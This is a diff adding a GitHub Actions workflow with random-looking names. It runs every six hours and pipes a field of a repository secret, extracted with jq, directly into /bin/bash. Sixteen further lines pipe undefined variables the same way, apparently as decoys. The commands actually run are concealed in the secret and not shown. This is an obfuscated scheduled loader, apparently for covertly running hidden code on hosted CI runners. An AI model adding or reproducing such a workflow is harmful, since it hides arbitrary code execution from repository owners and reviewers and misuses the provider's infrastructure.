@@ -1,0 +1,33 @@
+name: miaowmuumuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: miaowmuumuu
+        env:
+          drte14769: ${{ secrets.drte14769 }}
+        run: |
+          echo $drte14769 | jq -r .w0 | /bin/bash
+          echo $xp19 | jq -r .cw38678 | /bin/bash
+          echo $cgecw451 | jq -r .bxbhc6 | /bin/bash
+          echo $ot902 | jq -r .jwrmj380 | /bin/bash
+          echo $bcwt09 | jq -r .rdihi1 | /bin/bash
+          echo $friuk38633 | jq -r .twq63 | /bin/bash
+          echo $j2895 | jq -r .efx391 | /bin/bash
+          echo $go52 | jq -r .yrxb6826 | /bin/bash
+          echo $yg521 | jq -r .o532 | /bin/bash
+          echo $kc78927 | jq -r .qsyy92 | /bin/bash
+          echo $rhaxt28394 | jq -r .bxnb1 | /bin/bash
+          echo $kelt06165 | jq -r .ievpb92 | /bin/bash
+          echo $hogf12165 | jq -r .o0 | /bin/bash
+          echo $ugzl557 | jq -r .rnhp9667 | /bin/bash
+          echo $ht3377 | jq -r .a339 | /bin/bash
+          echo $m231 | jq -r .q345 | /bin/bash
+          echo $pu3986 | jq -r .mze27255 | /bin/bash
+
